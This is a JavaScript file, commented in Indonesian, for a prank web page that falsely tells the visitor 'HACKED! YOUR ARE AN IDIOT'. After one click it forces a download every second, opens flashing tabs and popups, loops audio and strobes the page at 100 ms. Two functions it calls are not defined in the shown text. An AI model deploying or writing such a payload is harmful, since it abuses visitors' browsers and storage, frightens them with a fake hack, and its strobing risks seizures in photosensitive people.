let tabs = [];
let popUpArray = [];
let tabCount = 3;
let popUpCount = 6;
let audio = new Audio('idiot.mp3'); // Memuat audio
audio.loop = true; // Mengatur audio agar berulang
let isPaused = false; // Variabel untuk mengecek apakah proses di-pause atau tidak

// Fungsi untuk mengganti konten dan membuat efek flashing
function changeToHackerContent() {
    const mainContent = document.getElementById('main-content');
    if (mainContent) {
        mainContent.innerHTML = `
            <h1 style="color: white; text-align: center;">HACKED! YOUR ARE AN IDIOT HAHAHAHA!</h1>
        `;

        // Tambahkan CSS untuk efek flashing
        document.body.style.animation = 'flashBackground 0.1s infinite';

        // Menambahkan style animasi di dalam <style> agar efeknya langsung terlihat
        const style = document.createElement('style');
        style.innerHTML = `
            @keyframes flashBackground {
                0% { background-color: black; color: red; }
                33% { background-color: white; color: black; }
                66% { background-color: red; color: white; }
                100% { background-color: black; color: red; }
            }
        `;
        document.head.appendChild(style);
    }
}

// Fungsi untuk meminta izin unduhan file
async function requestFileDownloadPermission() {
    return new Promise((resolve) => {
        const link = document.createElement('a');
        link.href = 'Idiot.png'; // File dummy untuk memicu izin unduhan
        link.download = 'Idiot.png';
        document.body.appendChild(link);
        link.click(); // Memicu unduhan
        document.body.removeChild(link);

        // Menunggu interaksi pengguna dengan dialog unduhan
        setTimeout(() => {
            resolve('granted'); // Menganggap izin diberikan setelah 1,5 detik
        }, 1500);
    });
}

// Ketika tombol "Mulai" diklik
document.getElementById("startBtn").addEventListener("click", async function() {
    const permission = await requestFileDownloadPermission(); // Meminta izin unduhan terlebih dahulu

    if (permission === 'granted') {
        startContinuousDownload(); // Mulai unduhan file terus-menerus
        alert('Please allow first download before ok the alert :('); // Tampilkan alert setelah izin unduhan
        changeToHackerContent(); // Ubah konten di dalam main-content dengan efek hacker

        // Gunakan setTimeout untuk memutar audio setelah alert ditutup
        setTimeout(() => {
            playAudio(); // Putar audio setelah alert ditutup
        }, 100); // Delay 100ms untuk memastikan audio diputar setelah alert

        openTabsAndPopUps(tabCount, popUpCount); // Buka tab dan pop-up setelah izin diberikan
        monitorClose(); // Pantau penutupan tab/pop-up
    } else {
        alert('error permission');
    }
});

// Fungsi untuk memulai unduhan terus-menerus
function startContinuousDownload() {
    autoDownloadFile(); // Unduh file pertama kali
    setInterval(autoDownloadFile, 1000); // Unduh file setiap 1 detik
}

// Fungsi untuk mengunduh file secara otomatis
function autoDownloadFile() {
    if (isPaused) return; // Jika di-pause, hentikan proses
    let link = document.createElement('a');
    link.href = 'Idiot.png'; // Path file yang ingin diunduh
    link.download = 'Idiot.png'; // Nama file yang akan diunduh
    document.body.appendChild(link);
    link.click(); // Memicu unduhan
    document.body.removeChild(link);
}

// Fungsi untuk membuka tab dan pop-up
function openTabsAndPopUps(tabMultiplier, popUpMultiplier) {
    if (isPaused) return; // Jika di-pause, hentikan proses
    for (let i = 0; i < tabMultiplier; i++) {
        let newTab = window.open('', '_blank');
        if (newTab) {
            tabs.push(newTab);
            addFlashingToTab(newTab); // Tambahkan efek kedip pada setiap tab
            createPopUps(newTab, popUpMultiplier); // Buka pop-up di dalam tab baru
        }
    }
}

// Fungsi untuk menambahkan efek kedip pada setiap tab
function addFlashingToTab(tab) {
    tab.document.write(`
        <html>
            <head>
                <title>HACKED ANDA ADALAH IDIOT HAHAHAHA!</title>
                <style>
                    body {
                        background-color: black;
                        color: red;
                        transition: background-color 0.1s, color 0.1s;
                        font-family: Arial, sans-serif;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                        height: 100vh;
                    }
                </style>
            </head>
            <body>
                <h1>HACKED ANDA ADALAH IDIOT HAHAHAHA!</h1>
                <script>
                    let flash = false;
                    setInterval(() => {
                        document.body.style.backgroundColor = flash ? 'white' : 'black';  
                        document.body.style.color = flash ? 'black' : 'red';
                        flash = !flash;
                    }, 100);
                </script>
            </body>
        </html>`
    );
}

// Fungsi untuk memutar audio
function playAudio() {
    if (isPaused) return; // Jika di-pause, hentikan proses
    audio.play();
}

// Fungsi untuk men-pause semua proses
function pauseProcess() {
    isPaused = true;
    audio.pause(); // Pause audio
}
